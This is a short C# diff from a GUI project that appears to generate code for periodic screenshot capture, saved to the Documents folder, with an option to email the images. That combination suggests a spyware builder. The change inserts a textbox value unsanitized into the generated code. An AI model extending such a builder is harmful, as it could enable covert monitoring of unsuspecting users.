@@ -1313,7 +1313,7 @@ namespace DNAV_GUI
                             code += "Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)";
                             break;
                     }
-                    code += @", System.Drawing.Imaging.ImageFormat.Png, 60));
+                    code += @", System.Drawing.Imaging.ImageFormat.Png, " + screenshotIntervalTextbox.Text + @"));
                 screenshot.Start();";
                 }
                 if(screenshotEmailCheckbox.IsChecked == true)
